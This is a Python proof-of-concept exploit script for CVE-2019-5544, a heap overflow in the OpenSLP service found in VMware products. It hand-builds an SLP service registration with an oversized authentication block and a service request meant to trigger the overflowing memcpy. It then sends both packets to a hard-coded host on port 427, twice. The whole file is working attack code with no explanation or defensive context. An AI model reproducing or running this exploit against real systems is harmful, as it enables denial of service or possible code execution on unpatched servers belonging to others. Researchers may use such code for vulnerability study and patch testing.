import socket
################## CVE-2019-5544 ##################
'''
SLP_FUNCT_SRVREG to generate a UrlEntry in database, with a big opaquelen
'''
#        version   funcid     length           flag           extoffset        xid          langtaglen    langtag
header = b"\x02"  +b"\x03" + b"\x00\x10\x5e" + b"\x00\x00" + b"\x00\x00\x00" + b"\x66\x0d" +b"\x00\x02" + b"\x65\x6e"
#          reserved    lifetime  +   urllen      url                  auth
UrlEntry1 = b"\x00"  + b"\x10\x00" + b"\x00\x14" + b"http://www.baidu.com" + b"\x01"
#           bsd           length        timestamp             spistrlen     spistr
authblock = b"\x00\x00" + b"\x10\x00" + b"\x01\x01\x01\x01" + b"\x0f\xf6" + b"y"*0xff6 
#              srvtypelen    srvtype
service_type = b"\x00\x1c" + b"service:VMwareInfrastructure"
#            scopelistlen    scopelist
scope_list = b"\x00\x07"  +  b"default"
#                attrlistlen   attrlist
attribute_list = b"\x00\x0a" + b"pppppppppp"
authcount = b"\x00"
poc_1 = header + UrlEntry1 + authblock + service_type + scope_list + attribute_list + authcount
'''
SLP_FUNCT_SRVRQST to call the memcpy, trigger heap overflow
'''
#        version   funcid     length           flag           extoffset        xid          langtaglen    langtag
header = b"\x02"  +b"\x01" + b"\x00\x00\x47" + b"\x00\x00" + b"\x00\x00\x00" + b"\x00\x00" +b"\x00\x02" + b"\x65\x6e"
#         prlistlen     prlist          srvtypelen    srvtype                          scopelistlen    scopelist        predicatelen    predicate   spistrlen     spistr
srvrqst = b"\x00\x0a" + b"1234567890" + b"\x00\x1c" + b"service:VMwareInfrastructure" + b"\x00\x07"+   b"default"      + b"\x00\x00"              + b"\x00\x00" 
poc_2 = header + srvrqst
tcpClientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#
serverAddr = ('192.168.110.129',427)
tcpClientSocket.connect(serverAddr)
print('connect success!')
tcpClientSocket.send(poc_1)
tcpClientSocket.send(poc_2)
tcpClientSocket.close()
print('close socket!')
tcpClientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#
serverAddr = ('192.168.110.129',427)
tcpClientSocket.connect(serverAddr)
print('connect success!')
tcpClientSocket.send(poc_1)
tcpClientSocket.send(poc_2)
tcpClientSocket.close()
print('close socket!')
